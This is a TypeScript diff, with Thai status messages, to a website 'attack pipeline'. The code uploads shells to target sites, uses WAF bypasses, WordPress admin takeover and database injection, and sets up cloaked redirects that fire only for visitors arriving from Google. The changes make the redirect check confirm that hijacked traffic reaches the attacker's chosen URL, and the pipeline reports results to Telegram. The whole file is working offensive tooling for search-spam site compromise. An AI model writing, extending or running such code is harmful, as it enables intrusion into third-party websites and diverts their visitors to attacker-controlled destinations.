@@ -75,7 +75,10 @@ export interface UploadedFile {
   method: string;
   verified: boolean;
   redirectWorks: boolean;
+  redirectDestinationMatch: boolean;
+  finalDestination: string;
   httpStatus: number;
+  redirectChain?: string[];
 }
 
 export interface PipelineResult {
@@ -120,13 +123,82 @@ type EventCallback = (event: PipelineEvent) => void;
 //  VERIFICATION
 // ═══════════════════════════════════════════════════════
 
+interface VerificationResult {
+  verified: boolean;
+  redirectWorks: boolean;
+  redirectDestinationMatch: boolean;
+  finalDestination: string;
+  httpStatus: number;
+  phpNotExecuting?: boolean;
+  redirectChain?: string[];
+}
+
+/**
+ * Follow a redirect chain (HTTP 3xx) up to maxHops.
+ * Returns the chain of URLs and the final destination.
+ */
+async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ chain: string[]; finalUrl: string; finalStatus: number }> {
+  const chain: string[] = [startUrl];
+  let currentUrl = startUrl;
+  let finalStatus = 0;
+
+  for (let i = 0; i < maxHops; i++) {
+    try {
+      const resp = await fetch(currentUrl, {
+        method: "GET",
+        redirect: "manual",
+        headers: {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Referer": "https://www.google.com/search?q=test",
+        },
+        signal: AbortSignal.timeout(8000),
+      });
+      finalStatus = resp.status;
+
+      if (resp.status >= 300 && resp.status < 400) {
+        const loc = resp.headers.get("location");
+        if (!loc) break;
+        // Resolve relative URLs
+        const nextUrl = loc.startsWith("http") ? loc : new URL(loc, currentUrl).href;
+        chain.push(nextUrl);
+        currentUrl = nextUrl;
+        continue;
+      }
+      break; // Not a redirect, stop
+    } catch {
+      break;
+    }
+  }
+  return { chain, finalUrl: currentUrl, finalStatus };
+}
+
+/**
+ * Check if two URLs point to the same destination.
+ * Compares hostname + pathname, ignoring trailing slashes, query params, and protocol.
+ */
+function urlsMatchDestination(actual: string, expected: string): boolean {
+  try {
+    const a = new URL(actual);
+    const e = new URL(expected);
+    // Hostname match (case-insensitive)
+    if (a.hostname.toLowerCase() !== e.hostname.toLowerCase()) return false;
+    // Path match (normalize trailing slash)
+    const normPath = (p: string) => p.replace(/\/+$/, "") || "/";
+    if (normPath(a.pathname) !== normPath(e.pathname) && normPath(e.pathname) !== "/") return false;
+    return true;
+  } catch {
+    // Fallback: simple string containment
+    return actual.includes(expected) || expected.includes(actual);
+  }
+}
+
 async function verifyUploadedFile(
   fileUrl: string,
   redirectUrl: string,
   onEvent: EventCallback,
-): Promise<{ verified: boolean; redirectWorks: boolean; httpStatus: number; phpNotExecuting?: boolean }> {
+): Promise<VerificationResult> {
   try {
-    // Step 1: Check if file is accessible (not 403/404)
+    // ─── Step 1: Check if file is accessible (not 403/404) ───
     const resp = await fetch(fileUrl, {
       method: "GET",
       redirect: "manual",
@@ -145,38 +217,20 @@ async function verifyUploadedFile(
         detail: `❌ ไฟล์ไม่สามารถเข้าถึงได้ (HTTP ${httpStatus}): ${fileUrl}`,
         progress: 0,
       });
-      return { verified: false, redirectWorks: false, httpStatus };
+      return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus, redirectChain: [] };
     }
 
-    // Step 2: Check if redirect works (simulate search engine referer)
-    const redirectResp = await fetch(fileUrl + "?r=1", {
-      method: "GET",
-      redirect: "manual",
-      headers: {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Referer": "https://www.google.com/search?q=test",
-      },
-      signal: AbortSignal.timeout(10000),
-    });
-
-    const location = redirectResp.headers.get("location") || "";
-    const redirectWorks = (redirectResp.status === 301 || redirectResp.status === 302) &&
-      location.includes(new URL(redirectUrl).hostname);
-
-    // Step 2.5: Check if PHP is being executed or served as plain text
+    // ─── Step 2: Check PHP execution ───
     let phpNotExecuting = false;
-    if (!redirectWorks && fileUrl.endsWith(".php") && (httpStatus === 200)) {
+    if (fileUrl.endsWith(".php") && httpStatus === 200) {
       try {
         const phpCheckResp = await fetch(fileUrl, {
           method: "GET",
-          headers: {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-          },
+          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
           signal: AbortSignal.timeout(10000),
         });
         const phpBody = await phpCheckResp.text();
-        // If we see raw PHP tags in the response, PHP is not being executed
-        if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes("header(\"")) {
+        if (phpBody.includes("<?php") || phpBody.includes("@ini_set") || phpBody.includes("$_SERVER") || phpBody.includes('header("')) {
           phpNotExecuting = true;
           onEvent({
             phase: "verify",
@@ -185,15 +239,45 @@ async function verifyUploadedFile(
             progress: 40,
           });
         }
-      } catch {
-        // Ignore PHP check errors
+      } catch { /* ignore */ }
+    }
+
+    // ─── Step 3: Follow redirect chain with Google referer + ?r=1 ───
+    const triggerUrl = fileUrl + "?r=1";
+    const { chain, finalUrl, finalStatus } = await followRedirectChain(triggerUrl);
+    const redirectChain = chain;
+
+    // Check if we got a server-side redirect (3xx chain)
+    let redirectWorks = false;
+    let redirectDestinationMatch = false;
+    let finalDestination = finalUrl;
+
+    if (chain.length > 1) {
+      // We followed at least one redirect hop
+      redirectWorks = true;
+      redirectDestinationMatch = urlsMatchDestination(finalUrl, redirectUrl);
+
+      if (redirectDestinationMatch) {
+        onEvent({
+          phase: "verify",
+          step: "redirect_destination",
+          detail: `✅ Redirect ทำงานจริง! ${fileUrl} → ${finalUrl} (ตรงกับปลายทาง ${redirectUrl})`,
+          progress: 100,
+        });
+      } else {
+        onEvent({
+          phase: "verify",
+          step: "redirect_destination",
+          detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${fileUrl} → ${finalUrl} (ควรไป ${redirectUrl})`,
+          progress: 70,
+        });
       }
     }
 
+    // ─── Step 4: Check body for JS/meta redirect if no server-side redirect ───
     if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
-      // Try checking if the page content contains redirect JS
       try {
-        const bodyResp = await fetch(fileUrl + "?r=1", {
+        const bodyResp = await fetch(triggerUrl, {
           method: "GET",
           headers: {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -203,31 +287,53 @@ async function verifyUploadedFile(
         });
         const body = await bodyResp.text();
         const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
-        const hasMetaRedirect = body.includes("http-equiv=\"refresh\"") || body.includes("http-equiv='refresh'");
-        const hasRedirectUrl = body.includes(redirectUrl) || body.includes(new URL(redirectUrl).hostname);
+        const hasMetaRedirect = body.includes('http-equiv="refresh"') || body.includes("http-equiv='refresh'");
 
-        if ((hasJsRedirect || hasMetaRedirect) && hasRedirectUrl) {
-          onEvent({
-            phase: "verify",
-            step: "redirect_check",
-            detail: `✅ Redirect ทำงาน (via ${hasJsRedirect ? "JS" : "meta refresh"}): ${fileUrl}`,
-            progress: 100,
-          });
-          return { verified: true, redirectWorks: true, httpStatus, phpNotExecuting };
+        if (hasJsRedirect || hasMetaRedirect) {
+          redirectWorks = true;
+
+          // Extract the actual redirect target from the body
+          let extractedTarget = "";
+          // Try meta refresh: content="0;url=https://..."
+          const metaMatch = body.match(/content\s*=\s*["'][^"']*url\s*=\s*([^"'\s>]+)/i);
+          if (metaMatch) extractedTarget = metaMatch[1];
+          // Try JS: window.location = "https://..."
+          if (!extractedTarget) {
+            const jsMatch = body.match(/(?:window\.location|location\.(?:href|replace))\s*[=(]\s*["']([^"']+)["']/i);
+            if (jsMatch) extractedTarget = jsMatch[1];
+          }
+
+          if (extractedTarget) {
+            finalDestination = extractedTarget;
+            redirectDestinationMatch = urlsMatchDestination(extractedTarget, redirectUrl);
+          } else {
+            // Can't extract target, fallback to hostname check
+            const hasRedirectUrl = body.includes(redirectUrl) || body.includes(new URL(redirectUrl).hostname);
+            redirectDestinationMatch = hasRedirectUrl;
+            finalDestination = hasRedirectUrl ? redirectUrl : "unknown";
+          }
+
+          if (redirectDestinationMatch) {
+            onEvent({
+              phase: "verify",
+              step: "redirect_destination",
+              detail: `✅ Redirect ทำงานจริง! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination}`,
+              progress: 100,
+            });
+          } else {
+            onEvent({
+              phase: "verify",
+              step: "redirect_destination",
+              detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! (via ${hasJsRedirect ? "JS" : "meta refresh"}) ${fileUrl} → ${finalDestination} (ควรไป ${redirectUrl})`,
+              progress: 70,
+            });
+          }
         }
-      } catch {
-        // Ignore body check errors
-      }
+      } catch { /* ignore */ }
     }
 
-    if (redirectWorks) {
-      onEvent({
-        phase: "verify",
-        step: "redirect_check",
-        detail: `✅ Redirect ทำงาน (301 → ${location}): ${fileUrl}`,
-        progress: 100,
-      });
-    } else {
+    // ─── Step 5: Final verdict ───
+    if (!redirectWorks) {
       onEvent({
         phase: "verify",
         step: "redirect_check",
@@ -236,7 +342,15 @@ async function verifyUploadedFile(
       });
     }
 
-    return { verified: httpStatus >= 200 && httpStatus < 400, redirectWorks, httpStatus, phpNotExecuting };
+    return {
+      verified: httpStatus >= 200 && httpStatus < 400,
+      redirectWorks,
+      redirectDestinationMatch,
+      finalDestination,
+      httpStatus,
+      phpNotExecuting,
+      redirectChain,
+    };
   } catch (error: any) {
     onEvent({
       phase: "verify",
@@ -244,7 +358,7 @@ async function verifyUploadedFile(
       detail: `❌ Verification error: ${error.message}`,
       progress: 0,
     });
-    return { verified: false, redirectWorks: false, httpStatus: 0, phpNotExecuting: false };
+    return { verified: false, redirectWorks: false, redirectDestinationMatch: false, finalDestination: "", httpStatus: 0, phpNotExecuting: false, redirectChain: [] };
   }
 }
 
@@ -959,20 +1073,34 @@ export async function runUnifiedAttackPipeline(
           method: uploadResult.method,
           verified: verification.verified,
           redirectWorks: verification.redirectWorks,
+          redirectDestinationMatch: verification.redirectDestinationMatch,
+          finalDestination: verification.finalDestination,
           httpStatus: verification.httpStatus,
+          redirectChain: verification.redirectChain,
         });
 
-        aiDecisions.push(`✅ Upload success: ${shell.type} via ${uploadResult.method} → ${uploadResult.url} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`);
+        aiDecisions.push(`✅ Upload success: ${shell.type} via ${uploadResult.method} → ${uploadResult.url} (verified: ${verification.verified}, redirect: ${verification.redirectWorks}, destination: ${verification.redirectDestinationMatch ? '✅ match' : '❌ mismatch'} → ${verification.finalDestination})`);
 
-        // If we have a verified redirect, we can stop
-        if (verification.redirectWorks) {
+        // If we have a verified redirect TO THE CORRECT DESTINATION, we can stop
+        if (verification.redirectWorks && verification.redirectDestinationMatch) {
           onEvent({
             phase: "complete",
             step: "success",
-            detail: `🎉 สำเร็จ! Redirect ทำงานจริง: ${uploadResult.url} → ${config.redirectUrl}`,
+            detail: `🎉 สำเร็จ! Redirect ไปยังปลายทางจริง: ${uploadResult.url} → ${verification.finalDestination}`,
             progress: 100,
           });
           break;
+        }
+
+        // Redirect works but goes to wrong destination
+        if (verification.redirectWorks && !verification.redirectDestinationMatch) {
+          onEvent({
+            phase: "verify",
+            step: "destination_mismatch",
+            detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${uploadResult.url} → ${verification.finalDestination} (ควรไป ${config.redirectUrl}) — ลองต่อ`,
+            progress: 75,
+          });
+          // Don't break — keep trying other shells
         }
 
         // If file is accessible but redirect doesn't work yet
@@ -1014,7 +1142,10 @@ export async function runUnifiedAttackPipeline(
                 method: htmlUploadResult.method + "_php_fallback",
                 verified: htmlVerification.verified,
                 redirectWorks: htmlVerification.redirectWorks,
+                redirectDestinationMatch: htmlVerification.redirectDestinationMatch,
+                finalDestination: htmlVerification.finalDestination,
                 httpStatus: htmlVerification.httpStatus,
+                redirectChain: htmlVerification.redirectChain,
               });
 
               aiDecisions.push(`🔄 PHP fallback → HTML: ${htmlUploadResult.url} (verified: ${htmlVerification.verified}, redirect: ${htmlVerification.redirectWorks})`);
@@ -1052,7 +1183,10 @@ export async function runUnifiedAttackPipeline(
                 method: htaccessUploadResult.method + "_php_fallback",
                 verified: htaccessVerification.verified,
                 redirectWorks: htaccessVerification.redirectWorks,
+                redirectDestinationMatch: htaccessVerification.redirectDestinationMatch,
+                finalDestination: htaccessVerification.finalDestination,
                 httpStatus: htaccessVerification.httpStatus,
+                redirectChain: htaccessVerification.redirectChain,
               });
 
               aiDecisions.push(`🔄 PHP fallback → .htaccess: ${htaccessUploadResult.url} (verified: ${htaccessVerification.verified}, redirect: ${htaccessVerification.redirectWorks})`);
@@ -1153,7 +1287,10 @@ export async function runUnifiedAttackPipeline(
             method: `waf_bypass_${wafSuccess.method}`,
             verified: verification.verified,
             redirectWorks: verification.redirectWorks,
+            redirectDestinationMatch: verification.redirectDestinationMatch,
+            finalDestination: verification.finalDestination,
             httpStatus: verification.httpStatus,
+            redirectChain: verification.redirectChain,
           });
         }
 
@@ -1212,7 +1349,10 @@ export async function runUnifiedAttackPipeline(
             method: `alt_${altSuccess.vector}`,
             verified: verification.verified,
             redirectWorks: verification.redirectWorks,
+            redirectDestinationMatch: verification.redirectDestinationMatch,
+            finalDestination: verification.finalDestination,
             httpStatus: verification.httpStatus,
+            redirectChain: verification.redirectChain,
           });
         }
 
@@ -1266,7 +1406,10 @@ export async function runUnifiedAttackPipeline(
             method: `indirect_${indirectSuccess.vector}`,
             verified: verification.verified,
             redirectWorks: verification.redirectWorks,
+            redirectDestinationMatch: verification.redirectDestinationMatch,
+            finalDestination: verification.finalDestination,
             httpStatus: verification.httpStatus,
+            redirectChain: verification.redirectChain,
           });
         }
 
@@ -1325,13 +1468,18 @@ export async function runUnifiedAttackPipeline(
           aiDecisions.push(`✅ WP Admin Takeover success: ${wpSuccess.method} — ${wpSuccess.detail}`);
 
           // Mark as uploaded file for cloaking phase
+          // WP Admin takeover — verify redirect destination
+          const wpVerification = await verifyUploadedFile(wpSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
           uploadedFiles.push({
             url: wpSuccess.injectedUrl || config.targetUrl,
             shell: shells[0] || { id: "wp_admin", type: "wp_admin_inject" as any, filename: "functions.php", content: "", size: 0, mimeType: "text/plain", headers: {} },
             method: `wp_admin_${wpSuccess.method}`,
-            verified: true,
-            redirectWorks: true,
-            httpStatus: 200,
+            verified: wpVerification.verified,
+            redirectWorks: wpVerification.redirectWorks,
+            redirectDestinationMatch: wpVerification.redirectDestinationMatch,
+            finalDestination: wpVerification.finalDestination,
+            httpStatus: wpVerification.httpStatus,
+            redirectChain: wpVerification.redirectChain,
           });
 
           onEvent({
@@ -1405,13 +1553,18 @@ export async function runUnifiedAttackPipeline(
         if (dbSuccess) {
           aiDecisions.push(`✅ WP DB Injection success: ${dbSuccess.method} — ${dbSuccess.detail}`);
 
+          // WP DB injection — verify redirect destination
+          const dbVerification = await verifyUploadedFile(dbSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
           uploadedFiles.push({
             url: dbSuccess.injectedUrl || config.targetUrl,
             shell: shells[0] || { id: "wp_db", type: "wp_db_inject" as any, filename: "wp_options", content: "", size: 0, mimeType: "text/plain", headers: {} },
             method: `wp_db_${dbSuccess.method}`,
-            verified: true,
-            redirectWorks: true,
-            httpStatus: 200,
+            verified: dbVerification.verified,
+            redirectWorks: dbVerification.redirectWorks,
+            redirectDestinationMatch: dbVerification.redirectDestinationMatch,
+            finalDestination: dbVerification.finalDestination,
+            httpStatus: dbVerification.httpStatus,
+            redirectChain: dbVerification.redirectChain,
           });
 
           onEvent({
@@ -1510,23 +1663,46 @@ export async function runUnifiedAttackPipeline(
         // NOTE: shellless methods don't actually place files — they modify server config/DB
         // verified should be based on redirectWorks (actual redirect test), NOT just sr.success
         for (const sr of shelllessSuccesses) {
+          // Shellless — verify redirect destination if redirectWorks
+          let shelllessDestMatch = false;
+          let shelllessFinalDest = "";
+          let shelllessChain: string[] = [];
+          if (sr.redirectWorks && sr.injectedUrl) {
+            const shelllessVerify = await verifyUploadedFile(sr.injectedUrl, config.redirectUrl, onEvent);
+            shelllessDestMatch = shelllessVerify.redirectDestinationMatch;
+            shelllessFinalDest = shelllessVerify.finalDestination;
+            shelllessChain = shelllessVerify.redirectChain || [];
+          }
           uploadedFiles.push({
             url: sr.injectedUrl || config.targetUrl,
             shell: shells[0] || { id: "shellless", type: "shellless" as any, filename: sr.method, content: "", size: 0, mimeType: "text/html", headers: {} },
             method: `shellless_${sr.method}`,
-            verified: sr.redirectWorks === true, // Only verified if redirect actually works
+            verified: sr.redirectWorks === true && shelllessDestMatch,
             redirectWorks: sr.redirectWorks || false,
+            redirectDestinationMatch: shelllessDestMatch,
+            finalDestination: shelllessFinalDest,
             httpStatus: 200,
+            redirectChain: shelllessChain,
           });
         }
 
-        onEvent({
-          phase: "shellless",
-          step: "success",
-          detail: `✅ Shellless Attack สำเร็จ! ${shelllessSuccesses.length} methods ทำงาน, ${shelllessRedirects.length} redirects — ไม่ต้องวางไฟล์เลย`,
-          progress: 95,
-          data: { shelllessResults, successCount: shelllessSuccesses.length },
-        });
+        if (shelllessRedirects.length > 0) {
+          onEvent({
+            phase: "shellless",
+            step: "success",
+            detail: `✅ Shellless Attack สำเร็จ! ${shelllessRedirects.length} redirects ทำงานจริง (${shelllessSuccesses.length} methods พบช่องทาง) — ไม่ต้องวางไฟล์เลย`,
+            progress: 95,
+            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: shelllessRedirects.length },
+          });
+        } else {
+          onEvent({
+            phase: "shellless",
+            step: "partial",
+            detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ redirect ยังไม่ทำงาน (0 redirects) — ต้อง execute เพิ่มเติม`,
+            progress: 95,
+            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 0 },
+          });
+        }
       } else {
         onEvent({
           phase: "shellless",
@@ -1747,11 +1923,16 @@ export async function runUnifiedAttackPipeline(
   // ─── Phase 5: Final Result ───
   const verifiedFiles = uploadedFiles.filter(f => f.verified);
   const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
+  const destinationMatchFiles = uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
   // Separate real uploads from shellless for accurate success determination
   const realVerifiedFiles = verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
-  const shelllessVerifiedFiles = verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
-  // Success = real file uploaded & verified, OR shellless with confirmed redirect
-  const success = realVerifiedFiles.length > 0 || shelllessVerifiedFiles.length > 0 || redirectWorkingFiles.length > 0;
+  const shelllessVerifiedFiles = verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks && f.redirectDestinationMatch);
+  // Success = redirect works AND goes to the correct destination
+  // "Partial success" = redirect works but goes to wrong destination (still counts as success but with warning)
+  const fullSuccess = destinationMatchFiles.length > 0;
+  const partialSuccess = !fullSuccess && redirectWorkingFiles.length > 0;
+  const fileDeployed = !fullSuccess && !partialSuccess && realVerifiedFiles.length > 0;
+  const success = fullSuccess || partialSuccess || fileDeployed;
 
   const result: PipelineResult = {
     success,
@@ -1787,11 +1968,27 @@ export async function runUnifiedAttackPipeline(
     cdnUploadResult: cdnUploadResult || undefined,
   };
 
-  if (success) {
+  if (fullSuccess) {
     onEvent({
       phase: "complete",
       step: "success",
-      detail: `🎉 Pipeline สำเร็จ! ${verifiedFiles.length} ไฟล์ verified, ${redirectWorkingFiles.length} redirects ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
+      detail: `🎉 Pipeline สำเร็จ! ${destinationMatchFiles.length} redirect(s) ไปยังปลายทางจริง → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl} (${Math.round(result.totalDuration / 1000)}s)`,
+      progress: 100,
+      data: result,
+    });
+  } else if (partialSuccess) {
+    onEvent({
+      phase: "complete",
+      step: "partial",
+      detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${redirectWorkingFiles.length} redirect(s) → ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl}) (${Math.round(result.totalDuration / 1000)}s)`,
+      progress: 100,
+      data: result,
+    });
+  } else if (fileDeployed) {
+    onEvent({
+      phase: "complete",
+      step: "partial",
+      detail: `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
       progress: 100,
       data: result,
     });
@@ -1817,11 +2014,13 @@ export async function runUnifiedAttackPipeline(
     const deployedUrls = realDeployedUrls.length > 0 
       ? realDeployedUrls 
       : shelllessWithRedirect.map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`);
-    // Determine notification type: only "success" if real files deployed or shellless redirect confirmed
-    const hasRealSuccess = realVerifiedFiles.length > 0;
-    const hasShelllessRedirect = shelllessVerifiedFiles.length > 0;
+    // Determine notification type based on destination match
+    const notificationType = fullSuccess ? "success" as const
+      : partialSuccess ? "partial" as const
+      : fileDeployed ? "partial" as const
+      : "failure" as const;
     const telegramPayload: TelegramNotification = {
-      type: hasRealSuccess ? "success" : (hasShelllessRedirect ? "partial" : (uploadedFiles.length > 0 ? "partial" : "failure")),
+      type: notificationType,
       targetUrl: config.targetUrl,
       redirectUrl: config.redirectUrl,
       deployedUrls,
@@ -1831,8 +2030,12 @@ export async function runUnifiedAttackPipeline(
       keywords: config.seoKeywords,
       cloakingEnabled: config.enableCloaking !== false && !!cloakingResult,
       injectedFiles: injectionResult?.injectedFiles?.length || 0,
-      details: success
-        ? `${verifiedFiles.length} verified, ${injectionResult?.injectedFiles?.length || 0} injected, ${cdnUploadResult ? "CDN hosted" : "inline content"}`
+      details: fullSuccess
+        ? `✅ ${destinationMatchFiles.length} redirect(s) → ${destinationMatchFiles[0]?.finalDestination || config.redirectUrl}, ${injectionResult?.injectedFiles?.length || 0} injected`
+        : partialSuccess
+        ? `⚠️ Redirect ทำงานแต่ไปผิดที่: ${redirectWorkingFiles[0]?.finalDestination || 'unknown'} (ควรไป ${config.redirectUrl})`
+        : fileDeployed
+        ? `⚠️ วางไฟล์สำเร็จ ${realVerifiedFiles.length} ไฟล์ แต่ redirect ยังไม่ทำงาน`
         : `${totalAttempts} attempts, ${errors.length} errors`,
     };
 
